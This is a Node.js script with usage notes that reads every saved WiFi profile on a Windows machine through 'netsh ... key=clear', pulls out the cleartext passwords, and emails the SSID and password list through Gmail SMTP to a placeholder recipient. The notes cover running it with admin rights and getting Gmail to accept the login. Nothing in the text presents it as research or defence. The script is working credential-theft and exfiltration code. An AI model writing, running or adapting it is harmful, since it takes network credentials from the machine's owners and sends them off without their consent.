```javascript
const { execSync } = require('child_process');
const nodemailer = require('nodemailer');

// Function to get WiFi profiles and their passwords
function getWifiProfiles() {
    try {
        // Execute the command to get WiFi profiles
        const commandOutput = execSync('netsh wlan show profiles').toString();

        // Regular expression to find all WiFi names
        const profileNames = commandOutput.match(/All User Profile\s+:\s+(.*)\r/g).map(name => name.split(': ')[1].trim());

        const wifiList = [];

        if (profileNames.length !== 0) {
            profileNames.forEach(name => {
                const wifiProfile = {};
                const profileInfo = execSync(`netsh wlan show profile "${name}"`).toString();

                // Check if the security key is absent
                if (profileInfo.includes('Security key           : Absent')) {
                    return;
                } else {
                    wifiProfile.ssid = name;
                    const profileInfoPass = execSync(`netsh wlan show profile "${name}" key=clear`).toString();
                    const passwordMatch = profileInfoPass.match(/Key Content\s+:\s+(.*)\r/);

                    // Assign password if found
                    wifiProfile.password = passwordMatch ? passwordMatch[1] : null;
                    wifiList.push(wifiProfile);
                }
            });
        }

        return wifiList;
    } catch (error) {
        console.error('Error fetching WiFi profiles:', error);
        return [];
    }
}

// Function to send email with WiFi details
async function sendEmail(wifiList) {
    const emailMessage = wifiList.map(item => `SSID: ${item.ssid}, Password: ${item.password}`).join('\n');

    // Create a transporter object
    const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: {
            user: 'login_name', // your email
            pass: 'password' // your email password
        }
    });

    // Email options
    const mailOptions = {
        from: 'name_of_sender', // sender address
        to: 'email_address', // list of receivers
        subject: 'WiFi SSIDs and Passwords',
        text: emailMessage
    };

    // Send email
    try {
        await transporter.sendMail(mailOptions);
        console.log('Email sent successfully');
    } catch (error) {
        console.error('Error sending email:', error);
    }
}

// Main function to execute the script
async function main() {
    const wifiList = getWifiProfiles();
    await sendEmail(wifiList);
}

main();
```

### Important Notes:
1. **Permissions**: The script requires administrative privileges to access WiFi profiles on Windows.
2. **Email Security**: If using Gmail, ensure that "Allow less secure apps" is enabled in your Google account settings, or use an App Password if you have 2-Step Verification enabled.
3. **Error Handling**: The code includes basic error handling for command execution and email sending.
4. **Environment**: This code is intended to run in a Node.js environment. Make sure you have Node.js installed on your machine.

